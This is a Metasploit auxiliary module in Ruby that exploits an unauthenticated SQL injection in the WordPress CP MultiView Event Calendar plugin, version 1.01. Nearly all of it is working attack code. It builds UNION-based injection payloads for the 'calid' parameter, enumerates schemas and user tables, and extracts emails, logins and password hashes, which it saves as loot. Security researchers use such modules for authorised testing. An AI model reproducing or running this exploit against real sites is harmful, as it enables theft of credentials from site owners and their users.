##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress CP MultiView Event Calendar Unauthenticated User/Hashes Enumeration via SQLi',
      'Description'    => %q{
      This module exploits an unauthenticated SQL injection in version 1.01 in order to pull out the users and their password
      hashes from the wordpress database.
      },
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/35073/']
        ],
      'Author'         =>
        [
          'bperry',
        ],
      'License'        => 'ExploitHub',
      'DisclosureDate' => "Oct 27 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Wordpress', '/']),
      ], self.class)
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)

    get_dbs = " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA#"

    res = send_injected_request(get_dbs)

    matches = res.body.scan(/#{left_marker}(.*?)#{right_marker}/)

    schemas = []
    matches.each do |match|
      schemas << match[0]
    end

    schemas.delete('performance_schema')
    schemas.delete('information_schema')
    schemas.delete('mysql')

    csv = "id,display_name,user_email,user_login,user_nicename,user_pass\n"
    schemas.each do |schema|
      print_status("Looking in schema: " + schema)
      get_tables = " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{schema.unpack("H*")[0]})#"

      res = send_injected_request(get_tables)

      matches = res.body.scan(/#{left_marker}(.*?)#{right_marker}/)

      tables = []
      matches.each do |match|
        tables << match[0] if match[0] =~ /users$/
      end

      tables.each do |table|
        print_status("Looking in table: #{table}")
        get_values = " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(ID AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(display_name AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(user_email AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(user_login AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(user_nicename AS CHAR),0x20),0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(user_pass AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL FROM #{schema}.#{table}#"

        res = send_injected_request(get_values)

        matches = res.body.scan(/#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{left_marker}(.*?)#{right_marker}/)

        matches.each do |match|
          csv << match[0] + "," + match[1] + "," + match[2] + "," + match[3] + "," + match[4] + "," + match[5] + "\n"
        end
      end
    end

    vprint_status(csv)
    path = store_loot('wordpress.users', 'text/plain', datastore['RHOST'], csv)
    print_status ("File saved to #{path}.")
  end

  def send_injected_request(str)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
        'cpmvc_id' => '1',
        'cpmvc_do_action' => 'mvparse',
        'f' => 'datafeed',
        'method' => 'list',
        'calid' => '1 ' + str
      }
    })
  end
end

